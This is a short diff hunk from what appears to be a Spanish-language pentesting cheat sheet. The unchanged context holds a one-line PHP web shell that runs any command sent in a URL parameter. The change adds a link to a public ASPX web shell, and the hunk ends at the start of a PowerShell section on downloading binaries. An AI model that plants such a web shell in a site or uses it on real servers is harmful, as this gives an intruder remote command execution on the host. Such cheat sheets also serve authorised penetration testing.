@@ -8,6 +8,11 @@ Web Shell PHP
 <?php system($_GET[cmd]);?>
 ```
 
+Web Shell .aspx
+```
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+```
+
 # Powershell
 
 Descargar binarios
